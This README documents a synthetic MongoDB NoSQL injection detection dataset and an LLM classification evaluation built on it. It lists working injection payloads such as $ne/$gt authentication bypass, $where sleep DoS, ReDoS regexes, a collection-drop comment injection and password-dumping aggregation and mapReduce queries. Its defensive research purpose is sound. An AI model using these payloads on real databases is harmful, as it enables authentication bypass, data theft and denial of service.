# NoSQL Injection Detection Dataset

## Overview

This dataset contains synthetically generated NoSQL database queries for MongoDB, designed for training and evaluating machine learning models to detect NoSQL injection attacks. The dataset includes both **malicious** (injection attempts) and **benign** (legitimate) queries.

## Dataset Structure

Each entry in the dataset contains the following fields:

| Field | Type | Description |
|-------|------|-------------|
| `id` | Integer | Unique identifier for each entry |
| `label` | String | Classification label: `"malicious"` or `"benign"` |
| `type` | String | Query type (see types below) |
| `collection` | String | MongoDB collection name being queried |
| `query` | String (JSON) | The query object in JSON format |
| `full_command` | String | Complete MongoDB command as it would appear in code |
| `description` | String | Human-readable description of the query |
| `timestamp` | String (ISO) | Generation timestamp |

## File Formats

The dataset is available in three formats:

- **CSV** (`.csv`): Tabular format, easy to import into spreadsheets and data analysis tools
- **JSON** (`.json`): Array of objects, pretty-printed for readability
- **JSONL** (`.jsonl`): One JSON object per line, optimized for streaming and ML pipelines

## Malicious Query Types

The dataset includes 10 types of NoSQL injection attacks:

### 1. Operator Injection (`operator_injection`)
The most common NoSQL injection type. Exploits MongoDB query operators to bypass authentication or leak data.

**Examples:**
```javascript
// Authentication bypass
db.users.find({"username": "admin", "password": {"$ne": ""}})
db.users.find({"username": {"$gt": ""}, "password": {"$gt": ""}})

// Data leakage
db.users.find({"_id": {"$ne": null}})
db.users.find({"role": {"$in": ["admin", "root"]}})
```

### 2. $where JavaScript Injection (`where_injection`)
Injects malicious JavaScript code via MongoDB's `$where` clause.

**Examples:**
```javascript
db.users.find({"$where": "this.password.length > 0"})
db.users.find({"$where": "function() { return this.role == 'admin' }"})
db.users.find({"$where": "sleep(5000)"}) // DoS attack
```

### 3. Regex Injection (`regex_injection`)
Uses malicious regular expressions for ReDoS (Regular Expression Denial of Service) attacks or data extraction.

**Examples:**
```javascript
db.users.find({"username": {"$regex": "^a(a+)+$"}}) // ReDoS
db.users.find({"password": {"$regex": ".*"}}) // Match all
db.users.find({"email": {"$regex": "admin.*", "$options": "i"}})
```

### 4. JSON Structure Injection (`json_injection`)
Manipulates query logic through JSON structure vulnerabilities.

**Examples:**
```javascript
db.users.find({"username": "admin", "$or": [{"1": "1"}]})
db.users.find({"username": {"$gt": ""}, "password": {"$gt": ""}})
db.users.find({"username.__proto__.admin": true}) // Prototype pollution
```

### 5. Array Injection (`array_injection`)
Exploits array-related MongoDB operators.

**Examples:**
```javascript
db.users.find({"roles": {"$in": [null, "", "admin"]}})
db.users.find({"tags": {"$elemMatch": {"$exists": true}}})
db.users.find({"permissions": {"$size": {"$gt": 0}}})
```

### 6. $or Condition Injection (`or_injection`)
Bypasses condition restrictions using the `$or` operator.

**Examples:**
```javascript
db.users.find({"$or": [{"username": "admin"}, {"1": "1"}]})
db.users.find({"$or": [{"admin": true}, {"admin": {"$exists": false}}]})
db.users.find({"$or": [{}, {"_id": {"$exists": true}}]})
```

### 7. Comment Injection (`comment_injection`)
Attempts to bypass filters using comment syntax (less effective in NoSQL).

**Examples:**
```javascript
db.users.find({"$comment": "'); db.users.drop(); //", "username": "admin"})
db.users.find({"username": "admin'--", "password": "anything"})
```

### 8. Type Confusion (`type_confusion`)
Exploits MongoDB's type system for injection attacks.

**Examples:**
```javascript
db.users.find({"password": {"$type": 2}}) // Find string types
db.users.find({"admin": {"$not": {"$type": 10}}}) // Not null
db.users.find({"role": []}) // Empty array
db.users.find({"permissions": null}) // Null value
```

### 9. Aggregation Pipeline Injection (`aggregation_injection`)
Injects malicious operations through MongoDB aggregation pipelines.

**Examples:**
```javascript
db.users.aggregate([{"$match": {"$where": "1==1"}}, {"$out": "stolen_data"}])
db.users.aggregate([{"$project": {"password": 1, "email": 1}}])
db.users.aggregate([{"$group": {"_id": null, "passwords": {"$push": "$password"}}}])
```

### 10. MapReduce Injection (`mapreduce_injection`)
Executes malicious JavaScript through MapReduce operations.

**Examples:**
```javascript
db.runCommand({
  "mapreduce": "users",
  "map": "function() { emit(this._id, this.password); }",
  "reduce": "function(key, values) { return values.join(','); }",
  "out": "attack_results"
})
```

## Benign Query Types

The dataset includes 10 types of legitimate MongoDB queries:

1. **Simple Find** (`simple_find`): Basic field matching queries
2. **Find with Projection** (`find_with_projection`): Queries that select specific fields
3. **Find with Sort** (`find_with_sort`): Queries with sorting operations
4. **Find with Limit** (`find_with_limit`): Paginated queries with skip/limit
5. **Count Query** (`count_query`): Document counting operations
6. **Distinct Query** (`distinct_query`): Retrieve unique field values
7. **Aggregation Query** (`aggregation_query`): Legitimate aggregation pipelines
8. **Update Query** (`update_query`): Document update operations
9. **Insert Query** (`insert_query`): Document insertion operations
10. **Delete Query** (`delete_query`): Document deletion operations

## Collections

Queries target the following MongoDB collections:
- `users` - User accounts and authentication
- `products` - Product catalog
- `orders` - Customer orders
- `sessions` - User sessions
- `accounts` - Account information
- `customers` - Customer data
- `transactions` - Financial transactions
- `logs` - Application logs
- `articles` - Content articles
- `comments` - User comments

## Dataset Statistics

When generating the default dataset with 10,000 entries at 50% malicious ratio:

- **Total entries**: 10,000
- **Malicious queries**: 5,000 (50%)
- **Benign queries**: 5,000 (50%)

### Type Distribution (Malicious)

Based on weighted generation probabilities:
- Operator Injection: ~25%
- $or Injection: ~15%
- $where Injection: ~15%
- Regex Injection: ~10%
- JSON Injection: ~10%
- Array Injection: ~8%
- Comment Injection: ~5%
- Type Confusion: ~5%
- Aggregation Injection: ~5%
- MapReduce Injection: ~2%

### Type Distribution (Benign)

Based on weighted generation probabilities:
- Simple Find: ~25%
- Find with Projection: ~15%
- Find with Sort: ~15%
- Find with Limit: ~15%
- Count Query: ~8%
- Aggregation Query: ~7%
- Update Query: ~5%
- Distinct Query: ~5%
- Insert Query: ~3%
- Delete Query: ~2%

## Example Entries

### Malicious Entry
```json
{
  "id": 1234,
  "label": "malicious",
  "type": "operator_injection",
  "collection": "users",
  "query": "{\"username\": \"admin\", \"password\": {\"$ne\": \"\"}}",
  "full_command": "db.users.find({\"username\": \"admin\", \"password\": {\"$ne\": \"\"}})",
  "description": "Using $ne operator to bypass authentication or leak data",
  "timestamp": "2025-01-15T10:30:45.123456"
}
```

### Benign Entry
```json
{
  "id": 5678,
  "label": "benign",
  "type": "simple_find",
  "collection": "products",
  "query": "{\"category\": \"electronics\"}",
  "full_command": "db.products.find({\"category\": \"electronics\"})",
  "description": "Simple field match query",
  "timestamp": "2025-01-15T10:30:45.789012"
}
```

## Generation Details

- **Faker Library**: Uses Faker to generate realistic data (usernames, emails, names, etc.)
- **Random Seed**: Default seed is 42 for reproducibility
- **Shuffling**: Entries are shuffled to prevent ordering bias
- **Timestamps**: Generated during creation using ISO 8601 format

## Use Cases

This dataset is designed for:

1. **Machine Learning Training**: Train classifiers to detect NoSQL injection attacks
2. **Security Research**: Study patterns in NoSQL injection techniques
3. **Testing WAF/IDS**: Validate web application firewalls and intrusion detection systems
4. **Educational Purposes**: Learn about NoSQL security vulnerabilities
5. **Benchmark Models**: Compare performance of different detection algorithms

## Generating Custom Datasets

You can generate custom datasets with different parameters:

```bash
# Generate 50,000 entries with 30% malicious
python nosql_dataset_generator.py --total 50000 --malicious-ratio 0.3

# Output in all formats
python nosql_dataset_generator.py --total 10000 --format all

# Custom output name
python nosql_dataset_generator.py --output my_custom_dataset

# Different random seed
python nosql_dataset_generator.py --seed 12345
```

## LLM Evaluation

This dataset can be used to evaluate Large Language Models' ability to detect NoSQL injection attacks.

### Models for Evaluation

| Model | Collaborator | Description |
|-------|--------------|-------------|
| **qwen2.5:7b** | @n1ck-n4m3 | Best overall (Chinese/English) |
| llama3.1:8b | - | Meta's baseline model |
| starling-lm:7b | - | High-quality chat model |
| mistral:7b | - | Fast and efficient |

---

### Qwen 2.5 7B Evaluation (by @n1ck-n4m3)

#### Prerequisites

**1. Install Ollama**

```bash
# macOS
brew install ollama

# Linux
curl -fsSL https://ollama.com/install.sh | sh

# Windows
# Download from https://ollama.com/download/windows
```

**2. Start Ollama Service**

```bash
ollama serve
```

**3. Download Qwen 2.5 Model**

```bash
ollama pull qwen2.5:7b

# Verify installation
ollama list
```

#### Model Specifications

| Spec | Value |
|------|-------|
| Parameters | 7B |
| Size | 4.7 GB |
| RAM Required | ~6 GB |
| Speed (M3 Pro) | ~30 tok/s |

#### Evaluation Prompt

Based on `evaluation.md`, use the following prompt template:

```
Below is a payload that may be benign or malicious. 
Your goal is to analyze it in a step by step manner, if the payload is indeed benign or malicious.
Classify the following payload as malicious (1) or benign (0).

payload = {full_command}

Provide your reasoning and then give the final result as just 0 or 1.
```

#### Python API Usage

```bash
pip install ollama tqdm
```

```python
import ollama

def classify_payload(full_command, model="qwen2.5:7b"):
    prompt = f"""Below is a payload that may be benign or malicious.
Classify the following payload as malicious (1) or benign (0).

payload = {full_command}

Result:"""
    
    response = ollama.chat(model=model, messages=[
        {'role': 'user', 'content': prompt}
    ])
    return response['message']['content']

# Example
result = classify_payload('db.users.find({"$where": "sleep(5000)"})')
print(result)  # Expected: 1 (malicious)
```

---

## Important Notes

### Security Considerations

⚠️ **Warning**: This dataset contains real injection attack patterns. Use responsibly:
- Only use for authorized security testing
- Do not use these patterns against systems you don't own
- Suitable for: CTF challenges, security research, educational contexts
- Not suitable for: Malicious attacks, unauthorized testing

### Dataset Limitations

- **Synthetic Data**: All queries are generated, not from real-world attacks
- **MongoDB Focus**: Primarily targets MongoDB syntax, not all NoSQL databases
- **Pattern-Based**: May not cover all possible injection variants
- **Static**: Does not include context about application code or user input validation

## License

This dataset is generated for educational and research purposes.



## Contact

For questions or issues with the dataset generator, please refer to the source code documentation.
